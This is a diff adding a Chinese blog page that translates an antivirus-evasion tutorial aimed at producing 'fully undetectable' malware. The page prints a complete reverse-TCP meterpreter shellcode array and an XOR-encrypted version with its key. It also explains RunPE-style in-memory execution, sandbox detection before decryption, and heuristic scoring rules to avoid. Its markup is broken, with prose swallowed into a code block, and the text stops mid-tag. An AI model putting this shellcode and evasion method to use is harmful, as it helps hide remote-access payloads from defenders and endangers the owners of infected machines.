@@ -1,0 +1,403 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>反检测的艺术1-反病毒软件及检测技术概述（翻译） | Lyon&#39;s blog</title>
+  <meta name="author" content="Lyon">
+  
+  <meta name="description" content="Walk steps step by step">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="反检测的艺术1-反病毒软件及检测技术概述（翻译）"/>
+  <meta property="og:site_name" content="Lyon&#39;s blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  #<link href="/favicon.ico" rel="icon">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <link rel="alternate" href="/atom.xml" title="Lyon&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script src="/js/jquery.min.js"></script>
+  <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?1d807422614f63c8de98cdc3b546860c";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+  <script>
+    (function(){
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+    
+  <script data-ad-client="ca-pub-6317609007693835" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+</head>
+
+
+<body>
+  <!--[if lte IE 8]> <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'> <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode"><img src="http://storage.ie6countdown.com/assets/100/images/banners/warning_bar_0027_Simplified Chinese.jpg" border="0" height="42" width="820" alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today." style='margin-left:auto;margin-right:auto;display: block;'/></a></div> <![endif]-->
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">Lyon&#39;s blog</a></h1>
+  <h2><a href="/">I hear and I forget.I see and I remember.I do and I understand.</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">首页</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+	<li> <a href="/atom.xml">RSS</a> </li>
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <time datetime="2020-09-03T11:39:22.000Z"><a href="/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">2020-09-03</a></time>
+      
+      
+  
+    <h1 class="title">反检测的艺术1-反病毒软件及检测技术概述（翻译）</h1>
+  
+
+    </header>
+	
+<!-- Table of Contents -->
+
+  <div id="toc" class="toc-article">
+  <strong class="toc-title">文章目录</strong>
+  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00_介绍"><span class="toc-number">1.</span> <span class="toc-text">0x00 介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01_相关术语"><span class="toc-number">2.</span> <span class="toc-text">0x01 相关术语</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于特征码的检测技术"><span class="toc-number">2.1.</span> <span class="toc-text">基于特征码的检测技术</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#静态分析"><span class="toc-number">2.2.</span> <span class="toc-text">静态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#动态分析"><span class="toc-number">2.3.</span> <span class="toc-text">动态分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#沙盒"><span class="toc-number">2.4.</span> <span class="toc-text">沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#启发式分析"><span class="toc-number">2.5.</span> <span class="toc-text">启发式分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#熵"><span class="toc-number">2.6.</span> <span class="toc-text">熵</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02_常用反检测方法"><span class="toc-number">3.</span> <span class="toc-text">0x02 常用反检测方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码混淆"><span class="toc-number">3.1.</span> <span class="toc-text">代码混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#压缩壳工具"><span class="toc-number">3.2.</span> <span class="toc-text">压缩壳工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加密壳工具"><span class="toc-number">3.3.</span> <span class="toc-text">加密壳工具</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03_加密壳压缩壳所面临的问题"><span class="toc-number">4.</span> <span class="toc-text">0x03 加密壳压缩壳所面临的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PE注入"><span class="toc-number">4.1.</span> <span class="toc-text">PE注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#完美的方法"><span class="toc-number">4.2.</span> <span class="toc-text">完美的方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">5.</span> <span class="toc-text">POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二部分"><span class="toc-number">6.</span> <span class="toc-text">第二部分</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+  </div>
+
+
+	
+    <div class="entry">
+      
+        <p>本篇文章将介绍对抗最新反病毒软件静态检测、动态检测及启发式分析最有效的方法。其中一些已经是公开并被大众所熟知的方法，但是仍然有一些方法和绕过技巧是实现完全不可被检测（FUD,Fully Undetectable）恶意代码的关键，同时恶意代码的大小与其反检测能力同等重要，因此在实现这些反检测方法的时候我会努力让恶意代码的文件大小尽可能的小。本文也将介绍反病毒软件及Windows操作系统的内部原理，因此读者最好具备一定的C/C++及汇编语言基础同时对PE文件结构有一定的了解<br><a id="more"></a></p>
+<h2 id="0x00_介绍">0x00 介绍</h2><p>反检测方法应该针对不同种类的恶意代码有不同的方法，本文介绍的所有反检测方法可以适用于所有种类的恶意代码但是本文侧重于stager meterpreter类型载荷，因为meterpreter能够做所有其他恶意代码能够做的事情，通过meterpreter会话可以做很多事情，包括权限提升、窃取凭据、操作进程/注册表，在利用漏洞后能够进行更多操作，meterpreter也拥有非常活跃的社区，在安全研究人员中很受欢迎。</p>
+<h2 id="0x01_相关术语">0x01 相关术语</h2><h3 id="基于特征码的检测技术">基于特征码的检测技术</h3><p>传统反病毒软件严重依赖基于特征码的检测技术检测恶意代码。一般，当恶意代码达到反病毒公司后，将交由恶意代码研究人员或者动态分析系统进行分析，一旦被确定为恶意代码，就会提取该恶意代码的特征码并将特征码添加到反病毒软件数据库中。</p>
+<h3 id="静态分析">静态分析</h3><p>静态分析是在没有实际执行程序的情况下对程序进行分析的技术。在大多数情况下，是对软件源代码的某些版本进行分析，在某些情况下也会对目标源码的某些形式进行分析。</p>
+<h3 id="动态分析">动态分析</h3><p>动态分析是在真实或者虚拟的计算机上执行程序进行分析。为了提高动态分析的有效性，必须对目标程序产生足够的输入让目标程序产生一些有趣的行为。</p>
+<h3 id="沙盒">沙盒</h3><p>在计算机安全中沙盒是一种隔离运行中程序的一种安全机制。通常用于执行未经测试或者不受信任的风险程序和代码，可能来自未经验证或者不受信任的第三方供应商、网站或者用户，通过沙盒执行可以避免损害主机或者操作系统。</p>
+<h3 id="启发式分析">启发式分析</h3><p>很多反病毒软件采用启发式分析检测目前未知病毒和已知病毒变种。启发式分析是一种基于专家的分析系统，使用各种规则和权重确定各种威胁和风险的安全性。多标准分析（MCA）是其中一种衡量手段，启发式分析不同于静态分析，静态分析依赖于自身的数据和统计信息。</p>
+<h3 id="熵">熵</h3><p> 在计算机科学中，熵是操作系统或者应用程序收集的用于密码学或者其他需要随机数据用途的随机性的一种衡量方式。这种随机性一般来源于硬件，如鼠标移动或者专用的硬件随机数生成器的。熵过低可能会对计算机性能或者安全性造成伤害。</p>
+<h2 id="0x02_常用反检测方法">0x02 常用反检测方法</h2><p>为了降低恶意代码被检测的风险，首先考虑使用的方式是加密程序、打包程序或者代码混淆。这些反检测技术和工具仍然可以绕过很多反病毒软件，但随着网络安全领域的进步，大多数的工具和方法已经过时并且无法生成完全不被检测的恶意代码。但是为了理解这些技术和工具的内部工作原理，这里还将对其进行简要描述。</p>
+<h3 id="代码混淆">代码混淆</h3><p>代码混淆可以定义为在不破坏实际功能的情况下对二进制程序的源代码进行混淆的一种方法，这使静态分析更加困难，同时还改变二进制代码的哈希签名。混淆只需添加几行垃圾代码或更改指令的执行顺序即可实现。这种方法可以绕过数量可观的反病毒软件，但要取决于您混淆了多少。</p>
+<h3 id="压缩壳工具">压缩壳工具</h3><p>压缩壳工具是压缩可执行文件并将压缩后的数据与解压缩代码合并为单个可执行文件的一种程序。当执行被压缩壳压缩的程序时，解压缩代码将在执行之前从压缩的代码重新创建原始代码。在大多数情况下，这对原始程序是透明的，因此可以与原始文件完全相同的方式使用压缩的可执行文件。当反病毒软件扫描被打包压缩的恶意代码时，它需要确定压缩算法并将其解压缩。由于压缩后的文件较难分析，因此恶意软件作者对压缩壳工具表现出了浓厚的兴趣。</p>
+<h3 id="加密壳工具">加密壳工具</h3><p>加密壳工具是对给定二进制文件进行加密的程序，以使其难以分析或者进行逆向工程。被加密壳打包的程序优两部分组成：builder和stub，builder仅对给定的二进制文件进行加密并将其放置在stub中，stub是加密壳中最重要的部分，当我们执行被加密壳打包的二进制文件时，第一个stub运行并解密原始二进制文件到内存，然后通过RunPE方法在内存中执行二进制文件（在大多数情况下）。</p>
+<div align="center"><br><img src="/img/anti_av_crypters.png" align><br></div>
+
+<h2 id="0x03_加密壳压缩壳所面临的问题">0x03 加密壳压缩壳所面临的问题</h2><p>在介绍最有效反检测技术之前，已知的反检测技术其实所面临的问题其实很少。但是现在的反病毒公司已经意识到了这种危险，现在他们不仅扫描恶意代码的特征和有害行为，还在扫描加密壳和压缩壳的特征。与检测恶意代码相比，检测加密壳和压缩壳相对容易，因为它们都必须做某些可疑的事情，例如解密加密的PE文件并在内存中执行。</p>
+<h3 id="PE注入">PE注入</h3><p>为了说明PE映像如何在内存中的执行，本文将会讲解Windows如何加载PE文件。在编译PE文件时，编译器会将主模块基地址设置为0x00400000，而编译过程中所有的地址指针和长跳转指令处的地址都是根据主模块地址计算的，在编译后期，编译器会在PE文件中创建一个重定位表，重定位表中包含的指令的地址取决于映像基址，例如地址指针和长跳转指令。<br>在执行PE映像时，操作系统会检查PE映像的默认基地址的可用性，如果默认基地址不可用，则操作系统会在启动过程系统加载程序需要之前，将PE映像加载到内存中的随机可用地址上。然后通过重定位表调整内存中的绝对地址，系统加载程序会修复所有与绝对地址相关的指令，然后启动这个被挂起的进程。这种机制称为地址随机化ASLR。<br>为了在内存上执行PE映像，加密壳需要解析PE头并重新定位绝对地址，同时必须模拟系统加载器，这种行为是非常可疑的。几乎每次当我们分析用C或其他高级语言编写的加密壳的时候，我们都会发现使用了NtUnmapViewOfSection或者ZwUnmapViewOfSection这两个Windows系统API，这两个函数的作用为从虚拟内存中卸载某些sections的映射，它们在RunPE类内存执行技术中起着非常大的作用，几乎%90的加密壳都会使用这种技术。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xNtUnmapViewOfSection = NtUnmapViewOfSection<span class="list">(<span class="keyword">GetProcAddress</span><span class="list">(<span class="keyword">GetModuleHandleA</span><span class="list">(<span class="string">"ntdll.dll"</span>)</span>, <span class="string">"NtUnmapViewOfSection"</span>)</span>)</span><span class="comment">;</span></span><br><span class="line">xNtUnmapViewOfSection<span class="list">(<span class="keyword">PI</span>.hProcess, PVOID<span class="list">(<span class="keyword">dwImageBase</span>)</span>)</span><span class="comment">;</span></span><br></pre></td></tr></table></figure></p>
+<p>当然，反病毒软件不能仅仅对使用这些Windows API函数的程序都判定为恶意代码，但使用这些函数的顺序非常重要。一小部分的加密壳（通常是用汇编语言编写）不使用这些函数并手动执行重定位，之前这种方式非常有效，但后续这种方法也将可能会失效，因为从逻辑上讲，正常程序都不会模拟系统加载器。另一个缺点是输入文件的熵极大增加，因为对整个PE文件进行了加密，熵将不可避免地上升，当反病毒软件检测到PE文件异常熵时，它们可能会将文件标记为可疑文件。</p>
+<div align="center"><br><img src="/img/anti_av_suspicious.png" align><br></div>
+
+<h3 id="完美的方法">完美的方法</h3><p>通过加密恶意代码实现反检测的概念很聪明，但是执行解密功能的函数应该适当地的做混淆处理，同时内存中执行解密代码的时候，我们必须在不执行重定位的情况下进行加密，而且还必须有一种检测执行环境的功能的检测机制恶意代码是否在沙盒中执行，如果检测机制检测到反病毒软件正在分析恶意软件，则不应执行解密功能。与其加密整个PE文件不如只加密shellcode或仅二进制文件的.text节，这样可以使熵值较低，也不用修改PE头部和其他节。<br>下面是恶意代码的执行流程图。</p>
+<div align="center"><br><img src="/img/anti_av_malware_flow.png" align><br></div><br>在环境检测函数中将会检查当前恶意代码是否在沙盒中被动态分析，如果检测到正在沙盒中被动态分析则继续执行main函数或者直接崩溃，如果未检测到沙盒环境则执行解密shellcode函数。<br>原始reverse tcp meterpreter的shellcode如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Shellcode[] = &#123;</span><br><span class="line">  <span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>,</span><br><span class="line">  <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>,</span><br><span class="line">  <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd1</span>,</span><br><span class="line">  <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>,</span><br><span class="line">  <span class="number">0xc7</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>, <span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>,</span><br><span class="line">  <span class="number">0xe4</span>, <span class="number">0x58</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>,</span><br><span class="line">  <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>,</span><br><span class="line">  <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>, <span class="number">0x8d</span>, <span class="number">0x5d</span>, <span class="number">0x68</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x77</span>,</span><br><span class="line">  <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x68</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xb8</span>,</span><br><span class="line">  <span class="number">0x90</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0xc4</span>, <span class="number">0x54</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x05</span>, <span class="number">0x68</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x68</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x11</span>, <span class="number">0x5c</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x97</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x56</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0c</span>,</span><br><span class="line">  <span class="number">0xff</span>, <span class="number">0x4e</span>, <span class="number">0x08</span>, <span class="number">0x75</span>, <span class="number">0xec</span>, <span class="number">0x68</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">  <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>,</span><br><span class="line">  <span class="number">0xd5</span>, <span class="number">0x8b</span>, <span class="number">0x36</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x56</span>, <span class="number">0x6a</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x68</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x93</span>, <span class="number">0x53</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x53</span>, <span class="number">0x57</span>, <span class="number">0x68</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>,</span><br><span class="line">  <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x75</span>, <span class="number">0xee</span>, <span class="number">0xc3</span></span><br><span class="line">&#125;;</span><br><span class="line">``` </span><br><span class="line">为了使熵值和文件大小保持在适当的值，我们将会使用简单的XOR加密算法加密这段shellcode，虽然XOR不是一个像RC4、blowfis的标准的加密算法，但是我们不需要一个强加密算法，因为反病毒软件不会去解密shellcode，仅仅是让这段shellcode对静态字符串分析不可读和不可检测就够了，同时使用XOR会使得解密更快并且避免使用加密库会使文件大小更小。</span><br><span class="line">经过XOR加密后的代码如下：</span><br></pre></td></tr></table></figure><br><br>unsigned char Shellcode[] = {<br>  0xfb, 0xcd, 0x8d, 0x9e, 0xba, 0x42, 0xe1, 0x93, 0xe2, 0x14, 0xcf, 0xfa,<br>  0x31, 0x12, 0xb1, 0x91, 0x55, 0x29, 0x84, 0xcc, 0xae, 0xc9, 0xf3, 0x32,<br>  0x08, 0x92, 0x45, 0xb8, 0x8b, 0xbd, 0x2d, 0x26, 0x66, 0x59, 0x0d, 0xb2,<br>  0x9a, 0x83, 0x4e, 0x17, 0x06, 0xe2, 0xed, 0x6c, 0xe8, 0x15, 0x0a, 0x48,<br>  0x17, 0xae, 0x45, 0xa2, 0x31, 0x0e, 0x90, 0x62, 0xe4, 0x6d, 0x0e, 0x4f,<br>  0xeb, 0xc9, 0xd8, 0x3a, 0x06, 0xf6, 0x84, 0xd7, 0xa2, 0xa1, 0xbb, 0x53,<br>  0x8c, 0x11, 0x84, 0x9f, 0x6c, 0x73, 0x7e, 0xb6, 0xc6, 0xea, 0x02, 0x9f,<br>  0x7d, 0x7a, 0x61, 0x6f, 0xf1, 0x26, 0x72, 0x66, 0x81, 0x3f, 0xa5, 0x6f,<br>  0xe3, 0x7d, 0x84, 0xc6, 0x9e, 0x43, 0x52, 0x7c, 0x8c, 0x29, 0x44, 0x15,<br>  0xe2, 0x5e, 0x80, 0xc9, 0x8c, 0x21, 0x84, 0x9f, 0x6a, 0xcb, 0xc5, 0x3e,<br>  0x23, 0x7e, 0x54, 0xff, 0xe3, 0x18, 0xd0, 0xe5, 0xe7, 0x7a, 0x50, 0xc4,<br>  0x31, 0x50, 0x6a, 0x97, 0x5a, 0x4d, 0x3c, 0xac, 0xba, 0x42, 0xe9, 0x6d,<br>  0x74, 0x17, 0x50, 0xca, 0xd2, 0x0e, 0xf6, 0x3c, 0x00, 0xda, 0xda, 0x26,<br>  0x2a, 0x43, 0x81, 0x1a, 0x2e, 0xe1, 0x5b, 0xce, 0xd2, 0x6b, 0x01, 0x71,<br>  0x07, 0xda, 0xda, 0xf4, 0xbf, 0x2a, 0xfe, 0x1a, 0x07, 0x24, 0x67, 0x9c,<br>  0xba, 0x53, 0xdd, 0x93, 0xe1, 0x75, 0x5f, 0xce, 0xea, 0x02, 0xd1, 0x5a,<br>  0x57, 0x4d, 0xe5, 0x91, 0x65, 0xa2, 0x7e, 0xcf, 0x90, 0x4f, 0x1f, 0xc8,<br>  0xed, 0x2a, 0x18, 0xbf, 0x73, 0x44, 0xf0, 0x4b, 0x3f, 0x82, 0xf5, 0x16,<br>  0xf8, 0x6b, 0x07, 0xeb, 0x56, 0x2a, 0x71, 0xaf, 0xa5, 0x73, 0xf0, 0x4b,<br>  0xd0, 0x42, 0xeb, 0x1e, 0x51, 0x72, 0x67, 0x9c, 0x63, 0x8a, 0xde, 0xe5,<br>  0xd2, 0xae, 0x39, 0xf4, 0xfa, 0x2a, 0x81, 0x0a, 0x07, 0x25, 0x59, 0xf4,<br>  0xba, 0x2a, 0xd9, 0xbe, 0x54, 0xc0, 0xf0, 0x4b, 0x29, 0x11, 0xeb, 0x1a,<br>  0x51, 0x76, 0x58, 0xf6, 0xb8, 0x9b, 0x49, 0x45, 0xf8, 0xf0, 0x0e, 0x5d,<br>  0x93, 0x84, 0xf4, 0xf4, 0xc4<br>};<br><br>unsigned char Key[] = {<br>  0x07, 0x25, 0x0f, 0x9e, 0xba, 0x42, 0x81, 0x1a<br>};<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">由于我们编写了一个新的恶意代码，因反病毒防病毒软件不知道我们的恶意代码的哈希签名，因此我们不必担心基于特征码的检测，我们将对shellcode进行加密并混淆我们的反检测、反逆向工程、解密功能的代码，这样就足够绕过基于静态和启发式扫描，最后就只需要绕过反病毒软件的动态扫描就可以了，绕过动态扫描最重要的方法是通过AV detect实现，但是在开始写AV detect功能之前我们将介绍反病毒软件的启发式分析引擎是如何工作的。</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">## 启发式引擎</span></span><br><span class="line">启发式引擎是基于统计和规则的分析机制。它们的主要目的是通过根据预定义的标准对代码片段进行分类并为代码片段提供威胁/风险等级，从而检测新一代（以前未知的）恶意代码，反病毒软件即使在扫描的简单hello world程序的情况下，启发式引擎也会确定威胁/风险评分，分数一旦高于阈值，该文件就会被标记为恶意。启发式引擎是反病毒软件中最高级的部分，它们使用大量规则和标准，因为没有反病毒公司发布有关其启发式引擎的设计文件或文档，所有关于其威胁/风险分级策略的已知选择性标准都是通过反复试验而发现的。</span><br><span class="line">一些有关威胁等级的已知规则：</span><br><span class="line">– 检测到解密循环</span><br><span class="line">– 读取当前的计算机名称</span><br><span class="line">– 读取密码机GUID</span><br><span class="line">– 连接随机域名</span><br><span class="line">– 读取Windows安装日期</span><br><span class="line">– 删除可执行文件</span><br><span class="line">– 在二进制文件中发现潜在的IP地址</span><br><span class="line">– 修改代理设置</span><br><span class="line">– 对正在运行的过程安装hook/patch程序</span><br><span class="line">– 注入资源管理器explorer</span><br><span class="line">– 注入远程进程</span><br><span class="line">– 查询进程信息</span><br><span class="line">– 设置进程错误模式避免弹出错误弹窗</span><br><span class="line">– 不正常的熵值</span><br><span class="line">– 检查潜在的反病毒软件</span><br><span class="line">– 监视特定的注册表项以进行更改</span><br><span class="line">– 包含提升特权的能力</span><br><span class="line">– 修改软件策略设置</span><br><span class="line">– 读取系统/视频BIOS版本</span><br><span class="line">– PE标头中存在不常见的section</span><br><span 